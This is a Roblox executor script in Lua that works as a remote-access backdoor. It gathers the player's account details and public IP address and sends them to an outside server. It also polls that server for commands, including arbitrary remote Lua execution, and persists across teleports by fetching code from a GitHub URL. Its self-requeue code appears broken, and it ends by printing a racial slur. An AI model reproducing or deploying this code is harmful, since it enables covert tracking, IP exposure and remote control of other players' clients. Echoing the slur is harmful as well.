local SERVER_URL = "https://robloxlol-production.up.railway.app"
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")

local function getIPInfo()
    local success, result = pcall(function()
        return game:HttpGet("https://api.ipify.org?format=json")
    end)
    if success then
        local data = HttpService:JSONDecode(result)
        return data.ip or "Hidden"
    end
    return "Hidden"
end

local function getExecutorName()
    if syn then return "Synapse X"
    elseif KRNL_LOADED then return "KRNL"
    elseif Fluxus then return "Fluxus"
    elseif getexecutorname then return getexecutorname() or "Unknown"
    else return "Unknown" end
end

local function getPlayerInfo()
    local player = LocalPlayer
    local gameName = "Unknown"
    pcall(function()
        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)
   
    return {
        username = player.Name,
        displayname = player.DisplayName,
        userid = tostring(player.UserId),
        accountAge = tostring(player.AccountAge),
        premium = player.MembershipType == Enum.MembershipType.Premium,
        game = gameName,
        placeId = tostring(game.PlaceId),
        jobId = game.JobId,
        platform = tostring(game:GetService("UserInputService"):GetPlatform()),
        executor = getExecutorName(),
        timestamp = os.date("%d/%m/%Y %H:%M:%S"),
        ip = getIPInfo(),
        status = "online"
    }
end

local function sendToServer(playerInfo)
    local payload = HttpService:JSONEncode(playerInfo)
   
    local success = pcall(function()
        request({
            Url = SERVER_URL .. "/log",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })
    end)
   
    if not success then
        pcall(function()
            syn.request({
                Url = SERVER_URL .. "/log",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
        end)
    end
   
    if not success then
        pcall(function()
            http_request({
                Url = SERVER_URL .. "/log",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
        end)
    end
end

local function startHeartbeat()
    spawn(function()
        while wait(10) do
            local success = pcall(function()
                request({
                    Url = SERVER_URL .. "/heartbeat",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({
                        userid = tostring(LocalPlayer.UserId),
                        status = "online",
                        timestamp = os.date("%d/%m/%Y %H:%M:%S")
                    })
                })
            end)
           
            if not success then
                pcall(function()
                    syn.request({
                        Url = SERVER_URL .. "/heartbeat",
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode({
                            userid = tostring(LocalPlayer.UserId),
                            status = "online",
                            timestamp = os.date("%d/%m/%Y %H:%M:%S")
                        })
                    })
                end)
            end
           
            if not success then
                pcall(function()
                    http_request({
                        Url = SERVER_URL .. "/heartbeat",
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode({
                            userid = tostring(LocalPlayer.UserId),
                            status = "online",
                            timestamp = os.date("%d/%m/%Y %H:%M:%S")
                        })
                    })
                end)
            end
        end
    end)
end

local function executeCommand(cmd)
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local rootPart = character:FindFirstChild("HumanoidRootPart")
   
    if cmd.command == "kick" then
        LocalPlayer:Kick(cmd.reason or "Kicked by admin")
       
    elseif cmd.command == "message" then
        game.StarterGui:SetCore("SendNotification", {
            Title = "Admin Message",
            Text = cmd.text or "",
            Duration = 10
        })
       
    elseif cmd.command == "speed" then
        if humanoid then
            humanoid.WalkSpeed = tonumber(cmd.speed) or 16
        end
       
    elseif cmd.command == "jump" then
        if humanoid then
            humanoid.JumpPower = tonumber(cmd.power) or 50
        end
       
    elseif cmd.command == "teleport" then
        if rootPart and cmd.x and cmd.y and cmd.z then
            rootPart.CFrame = CFrame.new(tonumber(cmd.x), tonumber(cmd.y), tonumber(cmd.z))
        end
       
    elseif cmd.command == "freeze" then
        if rootPart then
            rootPart.Anchored = true
        end
       
    elseif cmd.command == "unfreeze" then
        if rootPart then
            rootPart.Anchored = false
        end
       
    elseif cmd.command == "invisible" then
        if character then
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Transparency = 1
                end
                if part:IsA("Decal") or part:IsA("Face") then
                    part.Transparency = 1
                end
            end
        end
       
    elseif cmd.command == "visible" then
        if character then
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                    part.Transparency = 0
                end
                if part:IsA("Decal") or part:IsA("Face") then
                    part.Transparency = 0
                end
            end
        end
       
    elseif cmd.command == "god" then
        if humanoid then
            humanoid.MaxHealth = math.huge
            humanoid.Health = math.huge
        end
       
    elseif cmd.command == "ungod" then
        if humanoid then
            humanoid.MaxHealth = 100
            humanoid.Health = 100
        end
       
    elseif cmd.command == "kill" then
        if humanoid then
            humanoid.Health = 0
        end
       
    elseif cmd.command == "respawn" then
        LocalPlayer:LoadCharacter()
       
    elseif cmd.command == "chat" then
        if cmd.chatMessage then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(cmd.chatMessage, "All")
        end
       
    elseif cmd.luaCode then
        local success, err = pcall(function()
            loadstring(cmd.luaCode)()
        end)
       
        pcall(function()
            request({
                Url = SERVER_URL .. "/exec-result",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    userid = tostring(LocalPlayer.UserId),
                    success = success,
                    result = success and "Code executed successfully" or "",
                    error = err or ""
                })
            })
        end)
    end
end

local function listenForCommands()
    spawn(function()
        while wait(2) do
            local success, commands = pcall(function()
                local response = game:HttpGet(SERVER_URL .. "/commands/" .. LocalPlayer.UserId)
                return HttpService:JSONDecode(response)
            end)
           
            if success and commands and #commands > 0 then
                for _, cmd in ipairs(commands) do
                    pcall(function()
                        executeCommand(cmd)
                    end)
                end
            end
        end
    end)
end

-- Main execution
local playerInfo = getPlayerInfo()
sendToServer(playerInfo)
startHeartbeat()
listenForCommands()

-- Script principal à exécuter dans ton executor

local scriptURL = "https://raw.githubusercontent.com/zadadzdzadaz/lib/refs/heads/main/dazdaz.lua"

-- Fonction pour charger et exécuter le script
local function loadAndExecuteScript()
    local success, scriptCode = pcall(function()
        return game:HttpGet(scriptURL)
    end)
    
    if success then
        pcall(function()
            loadstring(scriptCode)()
        end)
        print("[Auto-Execute] Script chargé et exécuté avec succès !")
    else
        warn("[Auto-Execute] Erreur lors du chargement du script")
    end
end

-- Créer le code qui sera exécuté après téléportation
local autoExecuteCode = [[
    local scriptURL = "]] .. scriptURL .. [["
    
    -- Attendre que le jeu charge complètement
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    
    -- Petite pause pour être sûr que tout est chargé
    wait(2)
    
    -- Charger et exécuter le script
    local success, scriptCode = pcall(function()
        return game:HttpGet(scriptURL)
    end)
    
    if success then
        pcall(function()
            loadstring(scriptCode)()
        end)
        print("[Auto-Execute] Script réexécuté après téléportation !")
    end
    
    -- Re-queue pour la prochaine téléportation (boucle infinie)
    pcall(function()
        queue_on_teleport([==[]] .. autoExecuteCode .. [[]==])
    end)
]]

-- Queue le script pour la prochaine téléportation
pcall(function()
    queue_on_teleport(autoExecuteCode)
end)

-- Exécuter le script maintenant
loadAndExecuteScript()


print("nigger")

